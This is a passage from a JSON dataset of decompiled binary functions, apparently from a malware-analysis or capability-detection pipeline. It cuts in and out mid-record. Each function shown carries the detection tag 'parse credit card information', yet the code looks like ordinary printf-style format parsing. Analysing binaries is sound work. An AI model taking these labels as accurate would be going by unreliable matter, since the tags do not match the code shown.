}\ncode_r0x0044edd4:\n    if (((cVar5 != '\\0') && (cVar5 = fcn.0044ad58(),  cVar5 == '\\0')) && (*(param_1 + 0xb) == '\\0')) {\n        iVar7 = 0;\n        iVar14 = 0;\n        if ((param_1[7] >> 4 & 1) != 0) {\n            if (((param_1[7] >> 6 & 1) == 0) && ((*(param_1 + 7) & 1) == 0)) {\n                if ((param_1[7] >> 1 & 1) != 0) {\n                    iVar7 = 1;\n                    iVar14 = 1;\n                }\n            }\n            else {\n                iVar14 = 1;\n                iVar7 = 1;\n            }\n        }\n        iVar2 = *(param_1 + 0x2e);\n        if (((iVar2 != 0x78) && (iVar2 != 0x58)) || (bVar12 = true,  (param_1[7] >> 5 & 1) == 0)) {\n            bVar12 = false;\n        }\n        if ((iVar2 == 0x61) || (bVar4 = false,  iVar2 == iVar16)) {\n            bVar4 = true;\n        }\n        uStack32 = 0x30;\n        if ((bVar12) || (bVar4)) {\n            *(&stack0xfffffff0 + iVar7 * 2) = 0x30;\n            if ((iVar2 == 0x58) || (uVar10 = 0x78,  iVar2 == iVar16)) {\n                uVar10 = 0x58;\n            }\n            *(&stack0xfffffff2 + iVar7 * 2) = uVar10;\n            iVar7 = iVar7 + 2;\n            iVar14 = iVar7;\n        }\n        iVar11 = (param_1[8] - param_1[0xd]) - iVar7;\n        if ((*(param_1 + 7) & 0xc) == 0) {\n            uVar6 = param_1[2];\n            arg_ch = param_1 + 5;\n            if (0 < iVar11) {\n                do {\n                    iVar7 = iVar14;\n                    param_1 = puVar13;\n                    fcn.00454eb0(0x20, arg_ch, uVar6);\n                    if (*arg_ch == 0xffffffff) break;\n                    iVar8 = iVar8 + 1;\n                    puVar13 = param_1;\n                    iVar14 = iVar7;\n                } while (iVar8 < iVar11);\n            }\n        }\n        puVar13 = param_1 + 5;\n        fcn.0045589c(&stack0xfffffff0, iVar7, puVar13, param_1[2]);\n        if (((param_1[7] >> 3 & 1) != 0) && ((param_1[7] >> 2 & 1) == 0)) {\n            uVar6 = param_1[2];\n            iVar8 = 0;\n            if (0 < iVar11) {\n                do {\n                    fcn.00454eb0(uStack32, param_1 + 5, uVar6);\n                    if (param_1[5] == 0xffffffff) break;\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < iVar11);\n            }\n        }\n        iVar8 = 0;\n        if ((*(param_1 + 0xe) == '\\0') && (0 < param_1[0xd])) {\n            uVar6 = param_1[2];\n            if (*(uVar6 + 0x14) == '\\0') {\n                fcn.00453bd0();\n            }\n            arg_ch_00 = param_1[0xc];\n            uVar15 = 0;\n            bVar12 = param_1[0xd] == 0;\n            while (!bVar12) {\n                uStack32 = uStack32 & 0xffff0000;\n                iVar7 = fcn.0045ee07(&stack0xffffffe0, arg_ch_00, *(*(uVar6 + 0xc) + 4), param_1[2]);\n                if (iVar7 < 1) {\n                    param_1[5] = 0xffffffff;\n                    break;\n                }\n                fcn.00454eb0(uStack32, param_1 + 5, param_1[2]);\n                arg_ch_00 = arg_ch_00 + iVar7;\n                uVar15 = uVar15 + 1;\n                bVar12 = uVar15 == param_1[0xd];\n            }\n        }\n        else {\n            fcn.0045589c(param_1[0xc], param_1[0xd], param_1 + 5, param_1[2]);\n        }\n        if (((-1 < param_1[5]) && ((param_1[7] >> 2 & 1) != 0)) && (uVar6 = param_1[2],  0 < iVar11)) {\n            do {\n                fcn.00454eb0(0x20, puVar13, uVar6);\n                if (*puVar13 == 0xffffffff) break;\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < iVar11);\n        }\n    }\ncode_r0x0044f032:\n    uVar6 = fcn.004303e9(unaff_EBX);\n    return uVar6;\n}\n",
        "token_count": 3097
    },
    "0044cf4d": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044cf4d(uint32_t *param_1)\n\n{\n    uint32_t *arg_ch;\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint16_t *puVar3;\n    bool bVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t arg_ch_00;\n    uint unaff_EBX;\n    int32_t iVar8;\n    uint16_t *puVar9;\n    ushort uVar10;\n    int32_t iVar11;\n    bool bVar12;\n    uint arg_8h;\n    uint32_t uStack32;\n    uint32_t *puVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int16_t iVar16;\n    \n    uVar1 = *(param_1 + 0x2e);\n    puVar9 = uVar1;\n    if (puVar9 != 0x46) {\n        if (puVar9 == 0x4e) {\n            puVar9 = *param_1 & 8;\n            if (puVar9 != NULL) goto code_r0x0044d0d3;\n            *(param_1 + 6) = 8;\ncode_r0x0044cf8b:\n            uVar6 = param_1[2];\n            *(uVar6 + 0x1c) = 1;\n            *(uVar6 + 0x18) = 0x16;\n            uStack32 = 0x44cfa8;\n            uVar6 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n            return uVar6 & 0xffffff00;\n        }\n        if (param_1[10] != 0) goto code_r0x0044cf8b;\n        if (uVar1 < 0x6b) {\n            if (uVar1 == 0x6a) {\n                param_1[10] = 5;\n                goto code_r0x0044d0d3;\n            }\n            if (puVar9 == 0x49) {\n                puVar3 = param_1[3];\n                puVar9 = *puVar3;\n                if ((puVar9 == 0x33) && (puVar3[1] == 0x32)) {\n                    puVar9 = puVar3 + 2;\n                    param_1[10] = 10;\n                    param_1[3] = puVar9;\n                }\n                else if (puVar9 == 0x36) {\n                    if (puVar3[1] == 0x34) {\n                        puVar9 = puVar3 + 2;\n                        param_1[10] = 0xb;\n                        param_1[3] = puVar9;\n                    }\n                }\n                else if ((((puVar9 == 0x64) || (puVar9 == 0x69)) || (puVar9 == 0x6f)) ||\n                        (((puVar9 == 0x75 || (puVar9 == 0x78)) || (puVar9 == 0x58)))) {\n                    param_1[10] = 9;\n                }\n                goto code_r0x0044d0d3;\n            }\n            if (puVar9 == 0x4c) {\n                param_1[10] = 8;\n                goto code_r0x0044d0d3;\n            }\n            if (puVar9 == 0x54) {\n                param_1[10] = 0xd;\n                goto code_r0x0044d0d3;\n            }\n            if (uVar1 != 0x68) goto code_r0x0044d0d3;\n            if (*param_1[3] == 0x68) {\n                param_1[3] = param_1[3] + 1;\n                puVar9 = 0x1;\n            }\n            else {\n                puVar9 = 0x2;\n            }\n        }\n        else {\n            if (uVar1 != 0x6c) {\n                if (puVar9 == 0x74) {\n                    param_1[10] = 7;\n                }\n                else if (puVar9 == 0x77) {\n                    param_1[10] = 0xc;\n                }\n                else if (puVar9 == 0x7a) {\n                    param_1[10] = 6;\n                }\n                goto code_r0x0044d0d3;\n            }\n            if (*param_1[3] == 0x6c) {\n                param_1[3] = param_1[3] + 1;\n                puVar9 = 0x4;\n            }\n            else {\n                puVar9 = 0x3;\n            }\n        }\n        param_1[10] = puVar9;\ncode_r0x0044d0d3:\n        return CONCAT31(puVar9 >> 8, 1);\n    }\n    puVar9 = *param_1 & 8;\n    if (puVar9 != NULL) goto code_r0x0044d0d3;\n    *(param_1 + 6) = 7;\n    iVar16 = 0x41;\n    iVar8 = 0;\n    uVar1 = *(param_1 + 0x2e);\n    puVar13 = param_1;\n    if (uVar1 < 0x65) {\n        if (uVar1 == 100) {\ncode_r0x0044f104:\n            param_1[7] = param_1[7] | 0x10;\ncode_r0x0044f108:\n            cVar5 = fcn.00442a3f(0);\n        }\n        else if (uVar1 < 0x54) {\n            if (uVar1 == 0x53) {\ncode_r0x0044f131:\n                cVar5 = fcn.004531e4();\n            }\n            else {\n                if (uVar1 != 0x41) {\n                    if (uVar1 == 0x43) {\ncode_r0x0044f0be:\n                        cVar5 = fcn.00452199(0);\n                        goto code_r0x0044f141;\n                    }\n                    if (((uVar1 != 0x45) && (uVar1 != 0x46)) && (uVar1 != 0x47)) goto code_r0x0044f390;\n                }\ncode_r0x0044f09d:\n                cVar5 = fcn.0045153b();\n            }\n        }\n        else if (uVar1 == 0x58) {\n            arg_8h = 1;\ncode_r0x0044f0d3:\n            cVar5 = fcn.00443d33(arg_8h);\n        }\n        else {\n            if (uVar1 != 0x5a) {\n                if (uVar1 != 0x61) {\n                    if (uVar1 != 99) goto code_r0x0044f390;\n                    goto code_r0x0044f0be;\n                }\n                goto code_r0x0044f09d;\n            }\n            cVar5 = fcn.0045068d();\n        }\n    }\n    else if (uVar1 < 0x70) {\n        if (uVar1 == 0x6f) {\n            cVar5 = fcn.00452cb0();\n        }\n        else {\n            if (((uVar1 == 0x65) || (uVar1 == 0x66)) || (uVar1 == 0x67)) goto code_r0x0044f09d;\n            if (uVar1 == 0x69) goto code_r0x0044f104;\n            if (uVar1 != 0x6e) goto code_r0x0044f390;\n            cVar5 = fcn.0045298c();\n        }\n    }\n    else {\n        if (uVar1 != 0x70) {\n            if (uVar1 == 0x73) goto code_r0x0044f131;\n            if (uVar1 != 0x75) {\n                if (uVar1 != 0x78) goto code_r0x0044f390;\n                arg_8h = 0;\n                goto code_r0x0044f0d3;\n            }\n            goto code_r0x0044f108;\n        }\n        cVar5 = fcn.00452dd4();\n    }\ncode_r0x0044f141:\n    if ((cVar5 != '\\0') && (*(param_1 + 0xb) == '\\0')) {\n        iVar7 = 0;\n        iVar14 = 0;\n        if ((param_1[7] >> 4 & 1) != 0) {\n            if (((param_1[7] >> 6 & 1) == 0) && ((*(param_1 + 7) & 1) == 0)) {\n                if ((param_1[7] >> 1 & 1) != 0) {\n                    iVar7 = 1;\n                    iVar14 = 1;\n                }\n            }\n            else {\n                iVar14 = 1;\n                iVar7 = 1;\n            }\n        }\n        iVar2 = *(param_1 + 0x2e);\n        if (((iVar2 != 0x78) && (iVar2 != 0x58)) || (bVar12 = true,  (param_1[7] >> 5 & 1) == 0)) {\n            bVar12 = false;\n        }\n        if ((iVar2 == 0x61) || (bVar4 = false,  iVar2 == iVar16)) {\n            bVar4 = true;\n        }\n        uStack32 = 0x30;\n        if ((bVar12) || (bVar4)) {\n            *(&stack0xfffffff0 + iVar7 * 2) = 0x30;\n            if ((iVar2 == 0x58) || (uVar10 = 0x78,  iVar2 == iVar16)) {\n                uVar10 = 0x58;\n            }\n            *(&stack0xfffffff2 + iVar7 * 2) = uVar10;\n            iVar7 = iVar7 + 2;\n            iVar14 = iVar7;\n        }\n        iVar11 = (param_1[8] - param_1[0xd]) - iVar7;\n        if ((*(param_1 + 7) & 0xc) == 0) {\n            uVar6 = param_1[2];\n            arg_ch = param_1 + 5;\n            if (0 < iVar11) {\n                do {\n                    iVar7 = iVar14;\n                    param_1 = puVar13;\n                    fcn.00454eb0(0x20, arg_ch, uVar6);\n                    if (*arg_ch == 0xffffffff) break;\n                    iVar8 = iVar8 + 1;\n                    puVar13 = param_1;\n                    iVar14 = iVar7;\n                } while (iVar8 < iVar11);\n            }\n        }\n        puVar13 = param_1 + 5;\n        fcn.0045589c(&stack0xfffffff0, iVar7, puVar13, param_1[2]);\n        if (((param_1[7] >> 3 & 1) != 0) && ((param_1[7] >> 2 & 1) == 0)) {\n            uVar6 = param_1[2];\n            iVar8 = 0;\n            if (0 < iVar11) {\n                do {\n                    fcn.00454eb0(uStack32, param_1 + 5, uVar6);\n                    if (param_1[5] == 0xffffffff) break;\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < iVar11);\n            }\n        }\n        iVar8 = 0;\n        if ((*(param_1 + 0xe) == '\\0') && (0 < param_1[0xd])) {\n            uVar6 = param_1[2];\n            if (*(uVar6 + 0x14) == '\\0') {\n                fcn.00453bd0();\n            }\n            arg_ch_00 = param_1[0xc];\n            uVar15 = 0;\n            bVar12 = param_1[0xd] == 0;\n            while (!bVar12) {\n                uStack32 = uStack32 & 0xffff0000;\n                iVar7 = fcn.0045ee07(&stack0xffffffe0, arg_ch_00, *(*(uVar6 + 0xc) + 4), param_1[2]);\n                if (iVar7 < 1) {\n                    param_1[5] = 0xffffffff;\n                    break;\n                }\n                fcn.00454eb0(uStack32, param_1 + 5, param_1[2]);\n                arg_ch_00 = arg_ch_00 + iVar7;\n                uVar15 = uVar15 + 1;\n                bVar12 = uVar15 == param_1[0xd];\n            }\n        }\n        else {\n            fcn.0045589c(param_1[0xc], param_1[0xd], param_1 + 5, param_1[2]);\n        }\n        if (((-1 < param_1[5]) && ((param_1[7] >> 2 & 1) != 0)) && (uVar6 = param_1[2],  0 < iVar11)) {\n            do {\n                fcn.00454eb0(0x20, puVar13, uVar6);\n                if (*puVar13 == 0xffffffff) break;\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < iVar11);\n        }\n    }\ncode_r0x0044f390:\n    uVar6 = fcn.004303e9(unaff_EBX);\n    return uVar6;\n}\n",
        "token_count": 3107
    },
    "0044d0d7": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044d0d7(uint32_t *param_1)\n\n{\n    uint32_t *arg_10h;\n    int32_t **ppiVar1;\n    uint16_t uVar2;\n    int16_t iVar3;\n    uint16_t *puVar4;\n    int32_t *piVar5;\n    bool bVar6;\n    bool bVar7;\n    char cVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint unaff_EBX;\n    uint16_t *puVar14;\n    ushort uVar15;\n    uint arg_8h;\n    ushort uVar16;\n    int16_t iVar17;\n    uint32_t uVar18;\n    int32_t iVar19;\n    \n    uVar2 = *(param_1 + 0x2e);\n    puVar14 = uVar2;\n    if (puVar14 != 0x46) {\n        if (puVar14 == 0x4e) {\n            puVar14 = *param_1 & 8;\n            if (puVar14 != NULL) goto code_r0x0044d25d;\n            *(param_1 + 6) = 8;\ncode_r0x0044d115:\n            uVar9 = param_1[2];\n            *(uVar9 + 0x1c) = 1;\n            *(uVar9 + 0x18) = 0x16;\n            uVar9 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n            return uVar9 & 0xffffff00;\n        }\n        if (param_1[10] != 0) goto code_r0x0044d115;\n        if (uVar2 < 0x6b) {\n            if (uVar2 == 0x6a) {\n                param_1[10] = 5;\n                goto code_r0x0044d25d;\n            }\n            if (puVar14 == 0x49) {\n                puVar4 = param_1[3];\n                puVar14 = *puVar4;\n                if ((puVar14 == 0x33) && (puVar4[1] == 0x32)) {\n                    puVar14 = puVar4 + 2;\n                    param_1[10] = 10;\n                    param_1[3] = puVar14;\n                }\n                else if (puVar14 == 0x36) {\n                    if (puVar4[1] == 0x34) {\n                        puVar14 = puVar4 + 2;\n                        param_1[10] = 0xb;\n                        param_1[3] = puVar14;\n                    }\n                }\n                else if ((((puVar14 == 0x64) || (puVar14 == 0x69)) || (puVar14 == 0x6f)) ||\n                        (((puVar14 == 0x75 || (puVar14 == 0x78)) || (puVar14 == 0x58)))) {\n                    param_1[10] = 9;\n                }\n                goto code_r0x0044d25d;\n            }\n            if (puVar14 == 0x4c) {\n                param_1[10] = 8;\n                goto code_r0x0044d25d;\n            }\n            if (puVar14 == 0x54) {\n                param_1[10] = 0xd;\n                goto code_r0x0044d25d;\n            }\n            if (uVar2 != 0x68) goto code_r0x0044d25d;\n            if (*param_1[3] == 0x68) {\n                param_1[3] = param_1[3] + 1;\n                puVar14 = 0x1;\n            }\n            else {\n                puVar14 = 0x2;\n            }\n        }\n        else {\n            if (uVar2 != 0x6c) {\n                if (puVar14 == 0x74) {\n                    param_1[10] = 7;\n                }\n                else if (puVar14 == 0x77) {\n                    param_1[10] = 0xc;\n                }\n                else if (puVar14 == 0x7a) {\n                    param_1[10] = 6;\n                }\n                goto code_r0x0044d25d;\n            }\n            if (*param_1[3] == 0x6c) {\n                param_1[3] = param_1[3] + 1;\n                puVar14 = 0x4;\n            }\n            else {\n                puVar14 = 0x3;\n            }\n        }\n        param_1[10] = puVar14;\ncode_r0x0044d25d:\n        return CONCAT31(puVar14 >> 8, 1);\n    }\n    puVar14 = *param_1 & 8;\n    if (puVar14 != NULL) goto code_r0x0044d25d;\n    *(param_1 + 6) = 7;\n    iVar17 = 0x41;\n    uVar2 = *(param_1 + 0x2e);\n    if (uVar2 < 0x65) {\n        if (uVar2 == 100) {\ncode_r0x0044f45f:\n            param_1[7] = param_1[7] | 0x10;\ncode_r0x0044f463:\n            cVar8 = fcn.00442bd1(0);\n        }\n        else if (uVar2 < 0x54) {\n            if (uVar2 == 0x53) {\ncode_r0x0044f48c:\n                cVar8 = fcn.00453258();\n            }\n            else {\n                if (uVar2 != 0x41) {\n                    if (uVar2 == 0x43) {\ncode_r0x0044f419:\n                        cVar8 = fcn.00452241(0);\n                        goto code_r0x0044f49c;\n                    }\n                    if (((uVar2 != 0x45) && (uVar2 != 0x46)) && (uVar2 != 0x47)) goto code_r0x0044f784;\n                }\ncode_r0x0044f3f8:\n                cVar8 = fcn.004516e2();\n            }\n        }\n        else if (uVar2 == 0x58) {\n            arg_8h = 1;\ncode_r0x0044f42e:\n            cVar8 = fcn.00443ec5(arg_8h);\n        }\n        else {\n            if (uVar2 != 0x5a) {\n                if (uVar2 != 0x61) {\n                    if (uVar2 != 99) goto code_r0x0044f784;\n                    goto code_r0x0044f419;\n                }\n                goto code_r0x0044f3f8;\n            }\n            cVar8 = fcn.004506f0();\n        }\n    }\n    else if (uVar2 < 0x70) {\n        if (uVar2 == 0x6f) {\n            cVar8 = fcn.00452ccd();\n        }\n        else {\n            if (((uVar2 == 0x65) || (uVar2 == 0x66)) || (uVar2 == 0x67)) goto code_r0x0044f3f8;\n            if (uVar2 == 0x69) goto code_r0x0044f45f;\n            if (uVar2 != 0x6e) goto code_r0x0044f784;\n            cVar8 = fcn.00452a11();\n        }\n    }\n    else {\n        if (uVar2 != 0x70) {\n            if (uVar2 == 0x73) goto code_r0x0044f48c;\n            if (uVar2 != 0x75) {\n                if (uVar2 != 0x78) goto code_r0x0044f784;\n                arg_8h = 0;\n                goto code_r0x0044f42e;\n            }\n            goto code_r0x0044f463;\n        }\n        cVar8 = fcn.00452dea();\n    }\ncode_r0x0044f49c:\n    if ((cVar8 != '\\0') && (*(param_1 + 0xb) == '\\0')) {\n        iVar10 = 0;\n        iVar19 = 0;\n        if ((param_1[7] >> 4 & 1) != 0) {\n            if (((param_1[7] >> 6 & 1) == 0) && ((*(param_1 + 7) & 1) == 0)) {\n                if ((param_1[7] >> 1 & 1) != 0) {\n                    iVar10 = 1;\n                    iVar19 = 1;\n                }\n            }\n            else {\n                iVar19 = 1;\n                iVar10 = 1;\n            }\n        }\n        iVar3 = *(param_1 + 0x2e);\n        if (((iVar3 != 0x78) && (iVar3 != 0x58)) || (bVar6 = true,  (param_1[7] >> 5 & 1) == 0)) {\n            bVar6 = false;\n        }\n        if ((iVar3 == 0x61) || (bVar7 = false,  iVar3 == iVar17)) {\n            bVar7 = true;\n        }\n        uVar16 = 0x30;\n        if ((bVar6) || (bVar7)) {\n            *(&stack0xfffffff0 + iVar10 * 2) = 0x30;\n            if ((iVar3 == 0x58) || (uVar15 = 0x78,  iVar3 == iVar17)) {\n                uVar15 = 0x58;\n            }\n            *(&stack0xfffffff2 + iVar10 * 2) = uVar15;\n            iVar10 = iVar10 + 2;\n            iVar19 = iVar10;\n        }\n        iVar13 = (param_1[8] - param_1[0xd]) - iVar10;\n        if (((*(param_1 + 7) & 0xc) == 0) && (0 < iVar13)) {\n            uVar9 = param_1[5];\n            iVar11 = 0;\n            do {\n                uVar12 = param_1[0x112];\n                if (*(uVar12 + 8) == *(uVar12 + 4)) {\n                    if (*(uVar12 + 0xc) == '\\0') {\n                        uVar9 = 0xffffffff;\n                    }\n                    else {\n                        uVar9 = uVar9 + 1;\n                    }\n                    param_1[5] = uVar9;\n                }\n                else {\n                    param_1[5] = uVar9 + 1;\n                    *(uVar12 + 8) = *(uVar12 + 8) + 1;\n                    **param_1[0x112] = 0x20;\n                    *param_1[0x112] = *param_1[0x112] + 2;\n                }\n                uVar9 = param_1[5];\n                iVar10 = iVar19;\n            } while ((uVar9 != 0xffffffff) && (iVar11 = iVar11 + 1,  iVar11 < iVar13));\n        }\n        arg_10h = param_1 + 5;\n        fcn.0045592f(&stack0xfffffff0, iVar10, arg_10h);\n        ppiVar1 = param_1 + 0x112;\n        if (((param_1[7] >> 3 & 1) != 0) && (((param_1[7] >> 2 & 1) == 0 && (iVar10 = 0,  0 < iVar13)))) {\n            do {\n                piVar5 = *ppiVar1;\n                if (piVar5[2] == piVar5[1]) {\n                    if (*(piVar5 + 3) == '\\0') {\n                        uVar9 = 0xffffffff;\n                    }\n                    else {\n                        uVar9 = *arg_10h + 1;\n                    }\n                    *arg_10h = uVar9;\n                }\n                else {\n                    *arg_10h = *arg_10h + 1;\n                    piVar5[2] = piVar5[2] + 1;\n                    ***ppiVar1 = uVar16;\n                    **ppiVar1 = **ppiVar1 + 2;\n                }\n            } while ((*arg_10h != 0xffffffff) && (iVar10 = iVar10 + 1,  iVar10 < iVar13));\n        }\n        iVar10 = 0;\n        if ((*(param_1 + 0xe) == '\\0') && (0 < param_1[0xd])) {\n            uVar9 = param_1[2];\n            if (*(uVar9 + 0x14) == '\\0') {\n                fcn.00453bd0();\n            }\n            uVar12 = param_1[0xc];\n            uVar18 = 0;\n            if (param_1[0xd] != 0) {\n                do {\n                    uVar16 = 0;\n                    iVar19 = fcn.0045ee07(&stack0xffffffec, uVar12, *(*(uVar9 + 0xc) + 4), param_1[2]);\n                    ppiVar1 = param_1 + 0x112;\n                    if (iVar19 < 1) {\n                        *arg_10h = 0xffffffff;\n                        break;\n                    }\n                    piVar5 = *ppiVar1;\n                    if (piVar5[2] == piVar5[1]) {\n                        if (*(piVar5 + 3) == '\\0') {\n                            *arg_10h = 0xffffffff;\n                        }\n                        else {\n                            *arg_10h = *arg_10h + 1;\n                        }\n                    }\n                    else {\n                        *arg_10h = *arg_10h + 1;\n                        piVar5[2] = piVar5[2] + 1;\n                        ***ppiVar1 = uVar16;\n                        **ppiVar1 = **ppiVar1 + 2;\n                    }\n                    uVar12 = uVar12 + iVar19;\n                    uVar18 = uVar18 + 1;\n                } while (uVar18 != param_1[0xd]);\n            }\n        }\n        else {\n            fcn.0045592f(param_1[0xc], param_1[0xd], arg_10h);\n        }\n        uVar9 = *arg_10h;\n        if (((-1 < uVar9) && ((param_1[7] >> 2 & 1) != 0)) && (0 < iVar13)) {\n            do {\n                uVar12 = param_1[0x112];\n                if (*(uVar12 + 8) == *(uVar12 + 4)) {\n                    if (*(uVar12 + 0xc) == '\\0') {\n                        uVar9 = 0xffffffff;\n                    }\n                    else {\n                        uVar9 = uVar9 + 1;\n                    }\n                    *arg_10h = uVar9;\n                }\n                else {\n                    *arg_10h = uVar9 + 1;\n                    *(uVar12 + 8) = *(uVar12 + 8) + 1;\n                    **param_1[0x112] = 0x20;\n                    piVar5 = param_1[0x112];\n                    *piVar5 = *piVar5 + 2;\n                }\n                uVar9 = *arg_10h;\n            } while ((uVar9 != 0xffffffff) && (iVar10 = iVar10 + 1,  iVar10 < iVar13));\n        }\n    }\ncode_r0x0044f784:\n    uVar9 = fcn.004303e9(unaff_EBX);\n    return uVar9;\n}\n",
        "token_count": 3583
    },
    "0044d261": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044d261(uint32_t *param_1)\n\n{\n    uint32_t *arg_10h;\n    int32_t **ppiVar1;\n    uint16_t uVar2;\n    int16_t iVar3;\n    uint16_t *puVar4;\n    int32_t *piVar5;\n    bool bVar6;\n    bool bVar7;\n    char cVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint unaff_EBX;\n    uint16_t *puVar14;\n    ushort uVar15;\n    uint arg_8h;\n    ushort uVar16;\n    int16_t iVar17;\n    uint32_t uVar18;\n    int32_t iVar19;\n    \n    uVar2 = *(param_1 + 0x2e);\n    puVar14 = uVar2;\n    if (puVar14 != 0x46) {\n        if (puVar14 == 0x4e) {\n            puVar14 = *param_1 & 8;\n            if (puVar14 != NULL) goto code_r0x0044d3e7;\n            *(param_1 + 6) = 8;\ncode_r0x0044d29f:\n            uVar9 = param_1[2];\n            *(uVar9 + 0x1c) = 1;\n            *(uVar9 + 0x18) = 0x16;\n            uVar9 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n            return uVar9 & 0xffffff00;\n        }\n        if (param_1[10] != 0) goto code_r0x0044d29f;\n        if (uVar2 < 0x6b) {\n            if (uVar2 == 0x6a) {\n                param_1[10] = 5;\n                goto code_r0x0044d3e7;\n            }\n            if (puVar14 == 0x49) {\n                puVar4 = param_1[3];\n                puVar14 = *puVar4;\n                if ((puVar14 == 0x33) && (puVar4[1] == 0x32)) {\n                    puVar14 = puVar4 + 2;\n                    param_1[10] = 10;\n                    param_1[3] = puVar14;\n                }\n                else if (puVar14 == 0x36) {\n                    if (puVar4[1] == 0x34) {\n                        puVar14 = puVar4 + 2;\n                        param_1[10] = 0xb;\n                        param_1[3] = puVar14;\n                    }\n                }\n                else if ((((puVar14 == 0x64) || (puVar14 == 0x69)) || (puVar14 == 0x6f)) ||\n                        (((puVar14 == 0x75 || (puVar14 == 0x78)) || (puVar14 == 0x58)))) {\n                    param_1[10] = 9;\n                }\n                goto code_r0x0044d3e7;\n            }\n            if (puVar14 == 0x4c) {\n                param_1[10] = 8;\n                goto code_r0x0044d3e7;\n            }\n            if (puVar14 == 0x54) {\n                param_1[10] = 0xd;\n                goto code_r0x0044d3e7;\n            }\n            if (uVar2 != 0x68) goto code_r0x0044d3e7;\n            if (*param_1[3] == 0x68) {\n                param_1[3] = param_1[3] + 1;\n                puVar14 = 0x1;\n            }\n            else {\n                puVar14 = 0x2;\n            }\n        }\n        else {\n            if (uVar2 != 0x6c) {\n                if (puVar14 == 0x74) {\n                    param_1[10] = 7;\n                }\n                else if (puVar14 == 0x77) {\n                    param_1[10] = 0xc;\n                }\n                else if (puVar14 == 0x7a) {\n                    param_1[10] = 6;\n                }\n                goto code_r0x0044d3e7;\n            }\n            if (*param_1[3] == 0x6c) {\n                param_1[3] = param_1[3] + 1;\n                puVar14 = 0x4;\n            }\n            else {\n                puVar14 = 0x3;\n            }\n        }\n        param_1[10] = puVar14;\ncode_r0x0044d3e7:\n        return CONCAT31(puVar14 >> 8, 1);\n    }\n    puVar14 = *param_1 & 8;\n    if (puVar14 != NULL) goto code_r0x0044d3e7;\n    *(param_1 + 6) = 7;\n    iVar17 = 0x41;\n    uVar2 = *(param_1 + 0x2e);\n    if (uVar2 < 0x65) {\n        if (uVar2 == 100) {\ncode_r0x0044f853:\n            param_1[7] = param_1[7] | 0x10;\ncode_r0x0044f857:\n            cVar8 = fcn.00442d63(0);\n        }\n        else if (uVar2 < 0x54) {\n            if (uVar2 == 0x53) {\ncode_r0x0044f880:\n                cVar8 = fcn.004532cc();\n            }\n            else {\n                if (uVar2 != 0x41) {\n                    if (uVar2 == 0x43) {\ncode_r0x0044f80d:\n                        cVar8 = fcn.004522e9(0);\n                        goto code_r0x0044f890;\n                    }\n                    if (((uVar2 != 0x45) && (uVar2 != 0x46)) && (uVar2 != 0x47)) goto code_r0x0044fb87;\n                }\ncode_r0x0044f7ec:\n                cVar8 = fcn.00451889();\n            }\n        }\n        else if (uVar2 == 0x58) {\n            arg_8h = 1;\ncode_r0x0044f822:\n            cVar8 = fcn.00444057(arg_8h);\n        }\n        else {\n            if (uVar2 != 0x5a) {\n                if (uVar2 != 0x61) {\n                    if (uVar2 != 99) goto code_r0x0044fb87;\n                    goto code_r0x0044f80d;\n                }\n                goto code_r0x0044f7ec;\n            }\n            cVar8 = fcn.00450753();\n        }\n    }\n    else if (uVar2 < 0x70) {\n        if (uVar2 == 0x6f) {\n            cVar8 = fcn.00452cea();\n        }\n        else {\n            if (((uVar2 == 0x65) || (uVar2 == 0x66)) || (uVar2 == 0x67)) goto code_r0x0044f7ec;\n            if (uVar2 == 0x69) goto code_r0x0044f853;\n            if (uVar2 != 0x6e) goto code_r0x0044fb87;\n            cVar8 = fcn.00452a96();\n        }\n    }\n    else {\n        if (uVar2 != 0x70) {\n            if (uVar2 == 0x73) goto code_r0x0044f880;\n            if (uVar2 != 0x75) {\n                if (uVar2 != 0x78) goto code_r0x0044fb87;\n                arg_8h = 0;\n                goto code_r0x0044f822;\n            }\n            goto code_r0x0044f857;\n        }\n        cVar8 = fcn.00452e00();\n    }\ncode_r0x0044f890:\n    if (((cVar8 != '\\0') && (cVar8 = fcn.0044ad6f(),  cVar8 == '\\0')) && (*(param_1 + 0xb) == '\\0')) {\n        iVar10 = 0;\n        iVar19 = 0;\n        if ((param_1[7] >> 4 & 1) != 0) {\n            if (((param_1[7] >> 6 & 1) == 0) && ((*(param_1 + 7) & 1) == 0)) {\n                if ((param_1[7] >> 1 & 1) != 0) {\n                    iVar10 = 1;\n                    iVar19 = 1;\n                }\n            }\n            else {\n                iVar19 = 1;\n                iVar10 = 1;\n            }\n        }\n        iVar3 = *(param_1 + 0x2e);\n        if (((iVar3 != 0x78) && (iVar3 != 0x58)) || (bVar6 = true,  (param_1[7] >> 5 & 1) == 0)) {\n            bVar6 = false;\n        }\n        if ((iVar3 == 0x61) || (bVar7 = false,  iVar3 == iVar17)) {\n            bVar7 = true;\n        }\n        uVar16 = 0x30;\n        if ((bVar6) || (bVar7)) {\n            *(&stack0xfffffff0 + iVar10 * 2) = 0x30;\n            if ((iVar3 == 0x58) || (uVar15 = 0x78,  iVar3 == iVar17)) {\n                uVar15 = 0x58;\n            }\n            *(&stack0xfffffff2 + iVar10 * 2) = uVar15;\n            iVar10 = iVar10 + 2;\n            iVar19 = iVar10;\n        }\n        iVar13 = (param_1[8] - param_1[0xd]) - iVar10;\n        if (((*(param_1 + 7) & 0xc) == 0) && (0 < iVar13)) 